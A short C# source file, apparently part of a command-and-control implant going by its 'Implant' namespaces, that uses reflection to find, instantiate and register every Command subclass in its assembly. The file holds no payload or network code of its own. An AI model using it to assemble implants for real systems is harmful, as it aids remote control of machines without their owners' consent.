using Implant.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics.Tracing;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Input;

namespace Implant.Services
{


    public class CommandsList
    {
        private static List<Command> _commands = new List<Command>();

        public static void LoadAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();

            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(Command)))
                {
                    var instance = (Command)Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }

        public static List<Command> GetCommands()
        {
            return _commands;
        }
    }
}
